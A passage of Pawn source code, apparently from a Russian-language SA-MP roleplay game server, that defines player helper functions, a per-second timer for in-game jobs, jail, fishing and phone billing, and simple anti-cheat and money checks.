	else if(IsPlayerInRangeOfPoint(playerid, 4,362.2244,-2088.7981,7.8359) || IsPlayerInRangeOfPoint(playerid, 4,354.5382,-2088.7979,7.8359)) return true;
	return false;
}
//==============================================================================
stock IsLoginInvalid(text[])
{
	if(strfind(text, "none", true) != -1) return true;
	if(strfind(text, "None", true) != -1) return true;
	if(strfind(text, "NONE", true) != -1) return true;
	if(strfind(text, "'", true) != -1) return true;
	if(strfind(text, "/", true) != -1) return true;
	if(strfind(text, "%", true) != -1) return true;
	if(strfind(text, ".", true) != -1) return true;
	if(strfind(text, "%", true) != -1) return true;
	if(strfind(text, "&", true) != -1) return true;
	if(strfind(text, "*", true) != -1) return true;
	if(strfind(text, "@", true) != -1) return true;
	if(strfind(text, "(", true) != -1) return true;
	if(strfind(text, ")", true) != -1) return true;
	return false;
}
//==============================================================================
stock IsTextInvalid(text[])
{
	if(strfind(text, "'", true) != -1) return true;
	if(strfind(text, "%", true) != -1) return true;
	if(strfind(text, "&", true) != -1) return true;
	if(strfind(text, "*", true) != -1) return true;
	if(strfind(text, "(", true) != -1) return true;
	if(strfind(text, ")", true) != -1) return true;
	return false;
}
//==============================================================================
stock IsTextRussian(text[])
{
	if(strfind(text, "а", true) != -1) return true;
	if(strfind(text, "б", true) != -1) return true;
	if(strfind(text, "в", true) != -1) return true;
	if(strfind(text, "г", true) != -1) return true;
	if(strfind(text, "д", true) != -1) return true;
	if(strfind(text, "е", true) != -1) return true;
	if(strfind(text, "ё", true) != -1) return true;
	if(strfind(text, "ж", true) != -1) return true;
	if(strfind(text, "з", true) != -1) return true;
	if(strfind(text, "и", true) != -1) return true;
	if(strfind(text, "й", true) != -1) return true;
	if(strfind(text, "к", true) != -1) return true;
	if(strfind(text, "л", true) != -1) return true;
	if(strfind(text, "м", true) != -1) return true;
	if(strfind(text, "н", true) != -1) return true;
	if(strfind(text, "о", true) != -1) return true;
	if(strfind(text, "п", true) != -1) return true;
	if(strfind(text, "р", true) != -1) return true;
	if(strfind(text, "с", true) != -1) return true;
	if(strfind(text, "т", true) != -1) return true;
	if(strfind(text, "у", true) != -1) return true;
	if(strfind(text, "ф", true) != -1) return true;
	if(strfind(text, "х", true) != -1) return true;
	if(strfind(text, "ц", true) != -1) return true;
	if(strfind(text, "ч", true) != -1) return true;
	if(strfind(text, "ш", true) != -1) return true;
	if(strfind(text, "щ", true) != -1) return true;
	if(strfind(text, "ъ", true) != -1) return true;
	if(strfind(text, "ы", true) != -1) return true;
	if(strfind(text, "ь", true) != -1) return true;
	if(strfind(text, "э", true) != -1) return true;
	if(strfind(text, "ю", true) != -1) return true;
	if(strfind(text, "я", true) != -1) return true;
	return false;
}
//==============================================================================
stock GetVehicleType(carid)
{
	new modelid = GetVehicleModel(carid);
	if(modelid == 483 || modelid == 534 || modelid == 535 || modelid == 536 || modelid == 558 || modelid == 559
			|| modelid == 560 || modelid == 561 || modelid == 562 || modelid == 565 || modelid == 567 || modelid == 575
			|| modelid == 576) return true;
	return false;
}
//==============================================================================
stock IsACop(playerid)
{
	new member = PlayerInfo[playerid][pMember];
	if(member== F_POLICE_LS || member== F_POLICE_SF || member== F_FBI) return true;
	return false;
}
//==============================================================================
stock IsAArmy(playerid)
{
	new member = PlayerInfo[playerid][pMember];
	if(member== F_ARMY) return true;
	return false;
}
//==============================================================================
stock IsAGang(playerid)
{
	new member = PlayerInfo[playerid][pMember];
	if(member== F_GROVE || member== F_BALLAS || member== F_RIFA || member == F_AZTECAS || member == F_VAGOS) return true;
	return false;
}
//==============================================================================
stock IsAMafia(playerid)
{
	new member = PlayerInfo[playerid][pMember];
	if(member== F_LCN || member== F_YAKUZA || member== F_RM) return true;
	return false;
}
//==============================================================================
stock SaveGZ(idx)
{
	format(query, 512, "UPDATE "TABLE_GANGZONE" SET ginfo1 = '%f', ginfo2 = '%f', ginfo3 = '%f', ginfo4 = '%f', fraction = %i WHERE id = %i",
	GZInfo[idx][gCoords][0], GZInfo[idx][gCoords][1],GZInfo[idx][gCoords][2],GZInfo[idx][gCoords][3],GZInfo[idx][gFrak], idx);
	mysql_query(query);
	return true;
}
//==============================================================================
stock SetPlayerCriminal(playerid, killerid[], reason[])
{
	PlayerInfo[playerid][pCrimes]++;
	strmid(PlayerInfo[playerid][pWantedWho], killerid, 0, strlen(killerid), MAX_PLAYER_NAME);
	strmid(PlayerInfo[playerid][pWantedReason], reason, 0, strlen(reason), 32);
	SendMes(playerid, COLOR_LIGHTRED,"Вы совершили преступление: [ %s ]. Сообщает: %s.",reason, killerid);
	SendMes(playerid, COLOR_YELLOW, "Ваш уровень розыска: %i", PlayerInfo[playerid][pWanted]);
	foreach(new i:Player)
	{
		if(!IsPlayerConnected(i) || PlayerLogged[i] == 0) continue;
		if(IsACop(i)) SendMes(i, COLOR_ORANGE, "Рация: %s. Преступление: %s. Подозреваемый: %s", killerid, reason, PlayerInfo[playerid][pSendername]);
	}
	PlayerInfo[playerid][pZakon]--;
	return true;
}
//==============================================================================
stock CheckCar(playerid)
{
	if(IDVEH[playerid] != -1 && IsPlayerConnected(playerid))
	{
		if(IsPlayerInAnyVehicle(playerid) && !UseEnter[playerid] && IDVEH[playerid] != GetPlayerVehicleID(playerid))
		Punish(playerid);
	}
	return true;
}
//==============================================================================
stock ResetCarInfo(playerid)
{
	IDVEH[playerid]=-1;
	UseEnter[playerid] = false;
}
//==============================================================================
stock Punish(playerid)
{
	KickEx(playerid,112);
	ResetCarInfo(playerid); //если наказание не кик, но вы вытаскиваете игрока из авто, например посадите в тюрьму*/
}
//==============================================================================
stock PlayerTimer()
{
	new string[128];
	foreach(new i:Player)
	{
		if(!IsPlayerConnected(i)) continue;
		OnPlayerPickupExit(i);
		HospitalHealth(i);
		onCheckAirBrk(i);
		CheckWeapon(i);
		new Float:shealth;
		if(acstruct[i][checkmaptp] == 1)
		{
			new Float:dis = GetPlayerDistanceFromPoint(i, acstruct[i][maptp][0], acstruct[i][maptp][1], acstruct[i][maptp][2]);
			if(dis < 5.0)
			{
				new Float:disd = GetPlayerDistanceFromPoint(i, acstruct[i][LastOnFootPosition][0], acstruct[i][LastOnFootPosition][1], acstruct[i][LastOnFootPosition][2]);
				if(disd > 25.0) KickEx(i,1942);
			}
			acstruct[i][checkmaptp] = 0;
		}
		GetPlayerPos(i, acstruct[i][LastOnFootPosition][0], acstruct[i][LastOnFootPosition][1], acstruct[i][LastOnFootPosition][2]);
		if(GetPVarInt(i, "AntiBreik") > 0) SetPVarInt(i, "AntiBreik", GetPVarInt(i, "AntiBreik") - 1);
		if(GetPlayerState(i) == PLAYER_STATE_DRIVER)
		{
			new vehicleid = GetPlayerVehicleID(i);
			if(Fuel[vehicleid] < 1 && PlayerFuelMes[vehicleid] == true)
			{
				SendClientMessage(i, COLOR_GREY, CarHasNoFuel);
				Engine[vehicleid] = false;
				Lights[vehicleid] = false;
				PlayerFuelMes[vehicleid] = false;
			}
		}
		if(PlayerLogged[i] == 0)
		{
			if(TimeLogged[i] > -1 && TimeLogged[i] < 121)
			{
				TimeLogged[i]++;
				if(TimeLogged[i] == 120)
				{
					SendClientMessage(i, COLOR_LIGHTRED, LoggedTimeOver);
					GKick(i);
				}
			}
			continue;
		}
		if(GetPlayerWeapon(i) == 0 && PlayerLogged[i] == 1)
		{
			new gun1;
			gun1 = GetPlayerAmmo(i);
			if(gun1 > 3)
			{
				ResetWeapon(i);
				KickEx(i,1125);
			}
		}
		if(IsTheMember(PlayerInfo[i][pMember])) PlayerInfo[i][pCheckTime]++;
		if(Ether[i] == true) SetPVarInt(i, "InEther", GetPVarInt(i, "InEther") + 1);
		if(GetPlayerState(i) == 2)
		{
			if(SpeedVehicle(i) / 2 > MAX_SPEED && GetVehicleModel(GetPlayerVehicleID(i)) != 519 && GetVehicleModel(GetPlayerVehicleID(i)) != 520)
			{
				KickEx(i,1188);
			}
		}
		if(GetPVarInt(i, "TimeDM") != 0)
		{
			SetPVarInt(i, "TimeDM", GetPVarInt(i, "TimeDM")-1);
			if(GetPVarInt(i, "TimeDM") == 0 || GetPVarInt(i, "TimeDM") == 1)
			{
				ClearAnimText(i);
				DeletePVar(i, "TimeDM");
			}
		}
		if(Mobile[i] != -1 && EtherCalled[i] == false)
		{
			SetPVarInt(i, "CallTime", GetPVarInt(i, "CallTime") + 1);
			if(GetPVarInt(i, "CallTime") >= 10)
			{
				if(PlayerInfo[i][pBank] > PHONE_PRICE)
				{
					PlayerInfo[i][pBank] -= PHONE_PRICE;
					Exchequer+=PHONE_PRICE;
					format(query, 256, "UPDATE "TABLE_MAYOR" SET exchequer = %d", Exchequer);
					mysql_query(query);
					SetPVarInt(i, "CallTime", 0);
				}
				else
				{
					new caller = Mobile[i];
					SendClientMessage(caller, COLOR_GRAD2, "Недостаточно средств на счету...");
					SetPlayerSpecialAction(caller,SPECIAL_ACTION_STOPUSECELLPHONE);
					CellTime[caller] = -1;
					CellTime[i] = -1;
					SendClientMessage(i,  COLOR_GRAD2, "Недостаточно средств на счету...");
					Mobile[i] = -1;
					SetPlayerSpecialAction(i,SPECIAL_ACTION_STOPUSECELLPHONE);
					DeletePVar(i, "CallTime");
					DeletePVar(caller, "CallTime");
					SendClientMessage(i,  COLOR_GRAD2, "Недостаточно средств на счету...");
				}
			}
		}
		if(GetPlayerSpecialAction(i) == SPECIAL_ACTION_USEJETPACK)
		{
			KickEx(i,1233);
		}
		if(GetPVarInt(i, "TimeTaxi") > 0)
		{
			SetPVarInt(i, "TimeTaxi", GetPVarInt(i, "TimeTaxi") - 1);
			if(GetPVarInt(i, "TimeTaxi") == 0)
			{
				if(GetMoney(i) > GetPVarInt(i, "TaxiPrice"))
				{
					format(string, 32, "~r~-%i$", GetPVarInt(i, "TaxiPrice"));
					GameTextForPlayer(i, string, 5000, 1);
					format(string, 32, "~b~+%i$", GetPVarInt(i, "TaxiPrice"));
					GameTextForPlayer(GetPVarInt(i, "PlayerTaxi"), string, 5000, 1);
					GiveMoney(i, -GetPVarInt(i, "TaxiPrice"));
					PlayerInfo[GetPVarInt(i, "PlayerTaxi")][pPayCheck] += GetPVarInt(i, "TaxiPrice");
					SetPVarInt(i, "TimeTaxi", 30);
					SetPVarInt(GetPVarInt(i, "PlayerTaxi"), "TaxiMoney", GetPVarInt(GetPVarInt(i, "PlayerTaxi"), "TaxiMoney") + GetPVarInt(i, "TaxiPrice"));
				}
				else
				{
					SendClientMessage(i, COLOR_GREY, "Недостаточно средств!");
					RemovePlayerFromVehicle(i);
				}
			}
		}
		if(GetPVarInt(i, "FishingTime") > 0 && GetPVarInt(i, "Fishing") > 0)
		{
			SetPVarInt(i, "FishingTime", GetPVarInt(i, "FishingTime") - 1);
			if(GetPVarInt(i, "FishingTime") == 0)
			{
				new fish = random(3), massa, massa_, name[20];
				if(fish == 0) name = "маленькую", massa = 1 + random(15);
				if(fish == 1) name = "среднюю", massa = 15 + random(15);
				if(fish == 2) name = "большую", massa = 30 + random(15);
				if(fish == 3) name = "ничего", massa = 0;
				if(PlayerInfo[i][pLic][3] != 0) massa_ += massa*2;
				else massa_ = massa;
				PlayerInfo[i][pFish] += massa_;
				if(fish == 3) SendClientMessage(i, COLOR_BLUE, "Вы ничего не поймали. Попробуйте еще раз");
				else SendMes(i, COLOR_BLUE, "Вы поймали %s рыбу. Вес: %i кг", name, massa_);
				TogglePlayerControllable(i, 1);
				ApplyAnimation(i,"CARRY","crry_prtial",4.0,0,0,0,0,0);
				DeletePVar(i, "FishingTime");
				DeletePVar(i, "Fishing");
				RemovePlayerAttachedObject(i,0);
				RemovePlayerAttachedObject(i,GetPVarInt(i, "FishingObject"));
				DeletePVar(i, "FishingObject");
			}
		}
		if(GetPVarInt(i, "PlayerMechTime") > 0)
		{
			SetPVarInt(i, "PlayerMechTime", GetPVarInt(i, "PlayerMechTime") - 1);
			if(GetPVarInt(i, "PlayerMechTime") == 0)
			{
				SendMes(i, COLOR_LIGHTBLUE, "Вы починили транспорт %s'у за %i долларов", PlayerInfo[GetPVarInt(i, "PlayerMechID")][pSendername], GetPVarInt(GetPVarInt(i, "PlayerMechID"), "MechanicPrice"));
				SendMes(GetPVarInt(i, "PlayerMechID"), COLOR_LIGHTBLUE, "Автомеханик %s починил ваш транспорт за %i долларов", PlayerInfo[i][pSendername], GetPVarInt(GetPVarInt(i, "PlayerMechID"), "MechanicPrice"));
				format(string, 64, "%s починил транспорт", PlayerInfo[i][pSendername]);
				ProxDetectorNew(i,30.0,COLOR_PURPLE,string);
				GiveMoney(i, -GetPVarInt(GetPVarInt(i, "PlayerMechID"), "MechanicPrice"));
				PlayerInfo[GetPVarInt(i, "PlayerMechID")][pPayCheck] += GetPVarInt(GetPVarInt(i, "PlayerMechID"), "MechanicPrice");
				RepairVehicle(GetPVarInt(i, "PlayerMechVehID"));
				GetVehicleParamsEx(GetPVarInt(i, "PlayerMechVehID"),engine,lights,alarm,doors,bonnet,boot,objective);
				SetVehicleParamsEx(GetPVarInt(i, "PlayerMechVehID"),engine,lights,alarm,doors,VEHICLE_PARAMS_OFF,boot,objective);
				ApplyAnimation(i,"CARRY","crry_prtial",4.0,0,0,0,0,0);
				Bonnet[GetPVarInt(i, "PlayerMechVehID")] = false;
				DestroyPickup(Pickup_Mech[GetPVarInt(i, "PlayerMechVehID")]);
				DeletePVar(i, "PlayerMechTime");
				DeletePVar(GetPVarInt(i, "PlayerMechID"), "PlayerMech");
				DeletePVar(GetPVarInt(i, "PlayerMechID"), "MechanicPrice");
				DeletePVar(i, "PlayerMechVehID");
				DeletePVar(i, "PlayerMechID");
			}
		}
		if(GetPVarInt(i, "TimeBus") > 0)
		{
			SetPVarInt(i, "TimeBus", GetPVarInt(i, "TimeBus") - 1);
			format(string,32,"~r~%i",GetPVarInt(i, "TimeBus"));
			GameTextForPlayer(i, string, 2000, 6);
			if(GetPVarInt(i, "TimeBus") == 0)
			{
				DeletePVar(i, "TimeBus");
				new type = GetPVarInt(i, "TypeBus"), p = pPressed[i];
				SetPVarInt(i, "BusStop", 1);
				if(type == 1) SetPlayerRaceCheckpoint(i,0,BusCityLS[p][0],BusCityLS[p][1],BusCityLS[p][2],BusCityLS[p][3],BusCityLS[p][4],BusCityLS[p][5],5.0);
				if(type == 2) SetPlayerRaceCheckpoint(i,0,BusCitySF[p][0],BusCitySF[p][1],BusCitySF[p][2],BusCitySF[p][3],BusCitySF[p][4],BusCitySF[p][5],5.0);
				if(type == 3) SetPlayerRaceCheckpoint(i,0,BusCityLV[p][0],BusCityLV[p][1],BusCityLV[p][2],BusCityLV[p][3],BusCityLV[p][4],BusCityLV[p][5],5.0);
				if(type == 4) SetPlayerRaceCheckpoint(i,0,BusSchool[p][0],BusSchool[p][1],BusSchool[p][2],BusSchool[p][3],BusSchool[p][4],BusSchool[p][5],5.0);
				if(type == 5) SetPlayerRaceCheckpoint(i,0,BusLS[p][0],BusLS[p][1],BusLS[p][2],BusLS[p][3],BusLS[p][4],BusLS[p][5],5.0);
			}
		}
		if(EtherCalled[i] == true)
		{
			if(PlayerInfo[i][pBank] > CallPrice[PlayerInfo[i][pNews]-1])
			{
				PlayerInfo[i][pBank] -= CallPrice[PlayerInfo[i][pNews]-1];
				if(PlayerInfo[i][pNews]-1 == 0)
				{
					FracBank[8] += CallPrice[PlayerInfo[i][pNews]-1];
					SetOtherInt("ntoday", FracBank[8]);
				}
			}
			else
			{
				new caller = Mobile[i];
				SendClientMessage(caller, COLOR_GRAD2, "Недостаточно средств на счету...");
				SetPlayerSpecialAction(caller,SPECIAL_ACTION_STOPUSECELLPHONE);
				CellTime[caller] = -1;
				CellTime[i] = -1;
				Mobile[caller] = -1;
				if(EtherCalled[i] == true) EtherCalled[i] = false;
				if(EtherCalled[caller] == true) EtherCalled[caller] = false;
				SendClientMessage(i,  COLOR_GRAD2, "Недостаточно средств на счету...");
				Mobile[i] = -1;
				SetPlayerSpecialAction(i,SPECIAL_ACTION_STOPUSECELLPHONE);
			}
		}
		if(PlayerInfo[i][pJail] > 0)
		{
			PlayerInfo[i][pJailTime]--;
			if(PlayerInfo[i][pJailTime] == 0)
			{
				if(PlayerInfo[i][pJail] == 1)
				{
					SetPlayerPos(i, 1552.704467,-1675.532470,16.195312);
					SetPlayerFacingAngle(i,13.8672);
				}
				if(PlayerInfo[i][pJail] == 2)
				{
					SetPlayerPos(i, -1605.4390,712.8561,13.8085);
					SetPlayerFacingAngle(i,359.2197);
				}
				if(PlayerInfo[i][pJail] == 3)
				{
					SetPlayerPos(i, -1974.6592,-1017.6518,32.1719);
					SetPlayerFacingAngle(i,180.0);
				}
				SendClientMessage(i, COLOR_WHITE,"Вы заплатили свой долг обществу, теперь вы свободны");
				format(string, 32, "~g~Freedom");
				SetPlayerTeamColor(i);
				GameTextForPlayer(i, string, 5000, 1);
				PlayerInfo[i][pJail] = 0;
				PlayerInfo[i][pJailTime] = 0;
				SetPlayerInterior(i, 0);
				SetPlayerVirtualWorld(i, 0);
			}
		}
		if(PlayerInfo[i][pMuted] > 0)
		{
			PlayerInfo[i][pMuted]--;
			if(PlayerInfo[i][pMuted] == 0)
			{
				SendClientMessage(i, COLOR_LIGHTRED, "Время бан чата закончилось, теперь вы можете говорить");
				SendClientMessage(i, COLOR_WHITE, "Соблюдайте правила сервера, чтобы избежать бан чата");
			}
		}
		if(PlayerInfo[i][pWanted] > 0)
		{
			PlayerInfo[i][pWantedTime]--;
			if(PlayerInfo[i][pWantedTime] <= 0)
			{
				PlayerInfo[i][pWanted]--;
				SetPlayerWantedLevel(i, PlayerInfo[i][pWanted]);
				//SendMes(i, COLOR_YELLOW, "Ваш уровень розыска понизился до %i", PlayerInfo[i][pWanted]);
				if(PlayerInfo[i][pWanted] > 0) PlayerInfo[i][pWantedTime] = 1800 + random(300);
			}
		}
		SetPVarInt(i, "SatietyTime", GetPVarInt(i, "SatietyTime") + 1);
		if(GetPVarInt(i, "SatietyTime") == 180)
		{
			SetPVarInt(i, "SatietyTime", 0);
			PlayerInfo[i][pSatiety]--;
			if(PlayerInfo[i][pSatiety] <= 0)
			{
				PlayerInfo[i][pSatiety] = 0;
			}
			if(PlayerInfo[i][pSatiety] == 1 || PlayerInfo[i][pSatiety] == 15)
			{
				SendClientMessage(i, COLOR_YELLOW,"Вы проголодались! Сходите в закусочную!");
			}
		}
		SetPVarInt(i, "HealthTime", GetPVarInt(i, "HealthTime") + 1);
		if(GetPVarInt(i, "HealthTime") == 60)
		{
			SetPVarInt(i, "HealthTime", 0);
			if(PlayerInfo[i][pSatiety] <= 0)
			{
				GetPlayerHealth(i,shealth);
				SetHealth(i,shealth-2.000);
			}
		}
		if(PlayerInfo[i][pHeal] < 30)
		{
			SetPVarInt(i, "HealthTime_", GetPVarInt(i, "HealthTime_") + 1);
			if(GetPVarInt(i, "HealthTime_") == 600)
			{
				SetPVarInt(i, "HealthTime_", 0);
				SendClientMessage(i, COLOR_YELLOW, "У вас сильно ухудшилось здоровье, вылечитесь у медика!");
			}
		}
		if(MedicCallTime[i] > 0)
		{
			format(string, 32, "%d",MedicCallTime[i]);
			GameTextForPlayer(i, string, 1500, 6);
			MedicCallTime[i]--;
			if(MedicCallTime[i] == 0)
			{
				PlayerPlaySound(i, 1056, 0.0, 0.0, 0.0);
				GameTextForPlayer(i, "~r~–APKEP УCЏAмO‹‡Eм", 2500, 1);
				DisablePlayerRaceCheckpoint(i);
			}
		}
		if(MechCallTime[i] > 0)
		{
			format(string, 32, "%d",MechCallTime[i]);
			GameTextForPlayer(i, string, 1500, 6);
			MechCallTime[i]--;
			if(MechCallTime[i] == 0)
			{
				PlayerPlaySound(i, 1056, 0.0, 0.0, 0.0);
				GameTextForPlayer(i, "~r~–APKEP УCЏAмO‹‡Eм", 2500, 1);
				DisablePlayerRaceCheckpoint(i);
			}
		}
		if(TaxiCallTime[i] > 0)
		{
			format(string, 32, "%d",TaxiCallTime[i]);
			GameTextForPlayer(i, string, 1500, 6);
			TaxiCallTime[i]--;
			if(TaxiCallTime[i] == 0)
			{
				PlayerPlaySound(i, 1056, 0.0, 0.0, 0.0);
				GameTextForPlayer(i, "~r~–APKEP УCЏAмO‹‡Eм", 2500, 1);
				DisablePlayerRaceCheckpoint(i);
			}
		}
		if(TazerTime[i] > 0)
		{
			TazerTime[i]--;
			if(TazerTime[i] == 0)
			{
				TogglePlayerControllable(i, 1);
				ApplyAnimation(i,"CARRY","crry_prtial",4.0,0,0,0,0,0);
			}
		}
		if(GetPlayerDrunkLevel(i) > 0)
		{
			SetPVarInt(i, "DrunkTime", GetPVarInt(i, "DrunkTime") + 1);
			if(GetPVarInt(i, "DrunkTime") >= 100)
			{
				SetPlayerDrunkLevel(i, GetPlayerDrunkLevel(i) - 1000);
				SetPVarInt(i, "DrunkTime", 0);
			}
		}
		if(ProductTime[i] > 0 && GetPVarInt(i, "ProductID") > 0)
		{
			if(GetPlayerState(i) != 2)
			{
				ProductTime[i]--;
				format(string,32,"~r~%d",ProductTime[i]);
				GameTextForPlayer(i, string, 2000, 6);
				if(ProductTime[i] == 0)
				{
					SendClientMessage(i, COLOR_LIGHTRED, "Время истекло, выполнение заказа отменено");
					ProductInfo[GetPVarInt(i, "ProductID")][pStatus] = false;
					DeletePVar(i, "ProductID");
				}
			}
		}
		if(FuelTime[i] > 0 && GetPVarInt(i, "FuelID") > 0)
		{
			if(GetPlayerState(i) != 2)
			{
				FuelTime[i]--;
				format(string,32,"~r~%d",FuelTime[i]);
				GameTextForPlayer(i, string, 2000, 6);
				if(FuelTime[i] == 0)
				{
					SendClientMessage(i, COLOR_LIGHTRED, "Время истекло, выполнение заказа отменено");
					FuelInfo[GetPVarInt(i, "FuelID")][pStatus] = false;
					DisablePlayerRaceCheckpoint(i);
					DeletePVar(i, "FuelID");
				}
			}
		}
		if(materials_Time[i] > 0)
		{
			if(GetPlayerState(i) != 2)
			{
				materials_Time[i]--;
				format(string,32,"~r~%d",materials_Time[i]);
				GameTextForPlayer(i, string, 2000, 6);
				if(materials_Time[i] == 0)
				{
					SendClientMessage(i, COLOR_LIGHTRED, "Время истекло, перевозка материалов отменена");
					materials_Status[i] = 0;
				}
			}
		}
		if(lictest_Time[i] > 0)
		{
			if(GetPlayerState(i) != 2)
			{
				lictest_Time[i]--;
				format(string,32,"~r~%d",lictest_Time[i]);
				GameTextForPlayer(i, string, 2000, 6);
				if(lictest_Time[i] == 0)
				{
					SendClientMessage(i, COLOR_LIGHTRED, "Время истекло, вы провалили экзамен по вождению");
					DeletePVar(i, "LicTest");
					DeletePVar(i, "LicTestHealth");
					DeletePVar(i, "LicTestError");
				}
			}
		}
		if(GetPVarInt(i, "BusTime") > 0)
		{
			if(GetPlayerState(i) != 2)
			{
				SetPVarInt(i, "BusTime", GetPVarInt(i, "BusTime") - 1);
				format(string,32,"~r~%d",GetPVarInt(i, "BusTime") - 1);
				GameTextForPlayer(i, string, 2000, 6);
				if(GetPVarInt(i, "BusTime") == 0)
				{
					SendMes(i, COLOR_BLUE, "Рабочий день завершен. Вами заработано: %i долларов", GetPVarInt(i, "BusMoney"));
					SendClientMessage(i, COLOR_WHITE, "Деньги будут перечислены на счет во время зарплаты");
					PlayerInfo[i][pPayCheck] += GetPVarInt(i, "BusMoney");
					SetVehicleToRespawn(GetPVarInt(i, "RentBus"));
					DeletePVar(i, "BusTime");
					DeletePVar(i, "TypeBus");
					DeletePVar(i, "PriceBus");
					DeletePVar(i, "BusStop");
					DeletePVar(i, "BusMoney");
					pPressed[i] = 0;
				}
			}
		}
		if(CellTime[i] > -1)
		{
			CellTime[i]++;
			if(Mobile[Mobile[i]] == -1 && CellTime[i] == 5)
			{
				CellTime[i] = 0;
				format(string, 64, "У %s звонит мобильный телефон", PlayerInfo[Mobile[i]][pSendername]);
				ProxDetectorNew(Mobile[i],30.0,COLOR_PURPLE,string);
			}
		}
		if(GetPVarInt(i,"RobMatsCar") != 0)
		{
			if(GetPlayerState(i) == 2)
			{
				new vehid = GetPlayerVehicleID(i);
				if(vehid == GetPVarInt(i,"RobMatsCar"))
				{
					if(PlayerToPoint(10.0, i, 331.3846,1963.8951,17.6406))
					{
						if(GunKG[vehid] < 2000)
						{
							GunKG[vehid] += 50;
							Mats[4] -= 50;
							GameTextForPlayer(i,"~g~+50 materials",1000,5);
						}
						else
						{
							SendMes(i, COLOR_WHITE, "Материалов в машине: {ffff00}%i{ffffff}", GunKG[vehid]);
							SendClientMessage(i, COLOR_GREY, "Машина заполнена. Можете отъезжать!");
							DeletePVar(i,"RobMatsCar");
						}
					}
					else
					{
						SendClientMessage(i, COLOR_GREY, "Сбор материалов закончен, вы отъехали слишком далеко!");
						DeletePVar(i,"RobMatsCar");
					}
				}
			}
		}
		if(GetPVarInt(i,"RobZavodCar") != 0)
		{
			if(GetPlayerState(i) == 2)
			{
				new vehid = GetPlayerVehicleID(i);
				if(vehid == GetPVarInt(i,"RobZavodCar"))
				{
					if(PlayerToPoint(10.0, i, 2523.9641,2818.5845,10.8203))
					{
						if(GunKG[vehid] < 2000)
						{
							GunKG[vehid] += 50;
							Patronbox -= 50;
							GameTextForPlayer(i,"~g~+50 materials",1000,5);
							SetTimer("UpdateShaht",100,false);
						}
						else
						{
							SendMes(i, COLOR_WHITE, "Материалов в машине: {ffff00}%i{ffffff}", GunKG[vehid]);
							SendClientMessage(i, COLOR_GREY, "Машина заполнена. Можете отъезжать!");
							SaveShahta();
							SetTimer("UpdateShaht",100,false);
							DeletePVar(i,"RobZavodCar");
						}
					}
					else
					{
						SendClientMessage(i, COLOR_GREY, "Сбор материалов закончен, вы отъехали слишком далеко!");
						SaveShahta();
						SetTimer("UpdateShaht",100,false);
						DeletePVar(i,"RobZavodCar");
					}
				}
			}
		}
	}
}
//==============================================================================
stock SelectMats(playerid)
{
	new Keys,ud,lr;
	GetPlayerKeys(playerid,Keys,ud,lr);
	if(ud < 0) LeaveMats(playerid);
	if(ud > 0) LeaveMats(playerid);
	if(lr < 0) LeaveMats(playerid);
	if(lr > 0) LeaveMats(playerid);
	return true;
}
//==============================================================================
stock LeaveMats(playerid)
{
	MatsFactTime[playerid] = 0;
	ApplyAnimation(playerid,"CARRY","crry_prtial",4.0,0,0,0,0,0);
	SendClientMessage(playerid, COLOR_LIGHTRED, "Вы отошли от замка. Взлом отменен");
	return true;
}
//==============================================================================
stock MoneyCheck()
{
	for(new i = 0; i<MAX_PLAYERS; i++)
	{
		if(!IsPlayerConnected(i) || PlayerLogged[i] == 0) continue;
		new money = GetPlayerMoney(i);
		if(money > PlayerInfo[i][pCash])
		{
			if((money - PlayerInfo[i][pCash]) > 1) SetMoney(i,PlayerInfo[i][pCash]);
		}
	}
}
//==============================================================================
stock GiveMoney(playerid, amount)
{
	if(amount >= 100000)
	{
		new string[64];
		format(string,sizeof(string),"Player: %s, Money: %d",PlayerInfo[playerid][pSendername], amount);
		Log("GiveMoney",string);
	}
	PlayerInfo[playerid][pCash]+=amount;
	GivePlayerMoney(playerid, amount);
}
//==============================================================================
stock SetMoney(playerid, amount)
{
	PlayerInfo[playerid][pCash] = amount;
	ResetPlayerMoney(playerid);
	GivePlayerMoney(playerid, amount);
}
//==============================================================================
stock ResetMoney(playerid)
{
	PlayerInfo[playerid][pCash] = 0;
	ResetPlayerMoney(playerid);
}
//==============================================================================
stock GetMoney(playerid)
{
	return PlayerInfo[playerid][pCash];
}
//==============================================================================
stock HealthCheck()
{
	new Float: Heal;
	foreach(new i:Player)
	{
		if(!IsPlayerConnected(i) || PlayerLogged[i] == 0) continue;
		GetPlayerHealth(i, Heal);
		if(PlayerInfo[i][pHeal] < Heal) SetPlayerHealth(i, PlayerInfo[i][pHeal]);
		else PlayerInfo[i][pHeal] = Heal;
	}
}
//==============================================================================
stock ArmourCheck()
{
	new Float: Arm;
	foreach(new i:Player)
	{
		if(!IsPlayerConnected(i) || PlayerLogged[i] == 0) continue;
		GetPlayerArmour(i, Arm);
		if(PlayerArmour[i] < Arm) SetPlayerArmour(i, PlayerArmour[i]);
		else PlayerArmour[i] = Arm;
	}
}
//==============================================================================
stock Timer()
{
	new newhour,newminute,newsecond;
	gettime(newhour, newminute, newsecond);
	if ((newhour > ghour) || (newhour == 0 && ghour == 23))
	{
		ghour = newhour;
		PayDayTime();
		SetWorldTime(newhour);
	}
}
//==============================================================================
stock PayDayTime()
{
	GetHome();
	printf("GetHome");
	GetBizz();
	printf("GetBizz");
	if(Pick == true) SendClientMessageToAll(0xBC331AFF, "Напоминание! В штате проводятся выборы. Голосование в мэрии");
	foreach(new i:Player)
	{
		if(!IsPlayerConnected(i) || PlayerLogged[i] == 0) continue;
		new newhour,null1;
		gettime(newhour, null1, null1);
		SendMes(i, COLOR_WHITE, "Текущее время {331AFF}%d часов.", newhour);
		GameTextForPlayer(i, "PayDay", 4000, 1);
		PayDay(i);
		printf("PayDay for id: %d",i);
		GetExp(i);
		printf("GetEXP for id: %d",i);
	}
	SetOtherInt("grovebank", FracBank[0]);
	SetOtherInt("ballasbank", FracBank[1]);
	SetOtherInt("rifabank", FracBank[2]);
	SetOtherInt("aztecasbank", FracBank[3]);
	SetOtherInt("vagosbank", FracBank[4]);
}
//==============================================================================
stock KillPlayerTimers(playerid)
{
	KillTimer(AnimTimer[playerid]);
	KillTimer(KustTimer[playerid]);
}
//==============================================================================
stock PreloadAnimLib(playerid, animlib[])
{
	ApplyAnimation(playerid,animlib,"null",0.0,0,0,0,0,0);
	return false;
}
//==============================================================================
stock PreloadAllAnims(playerid)
{
	PreloadAnimLib(playerid,"BOMBER");
	PreloadAnimLib(playerid,"RAPPING");
	PreloadAnimLib(playerid,"SHOP");
	PreloadAnimLib(playerid,"BEACH");
	PreloadAnimLib(playerid,"SMOKING");
	PreloadAnimLib(playerid,"FOOD");
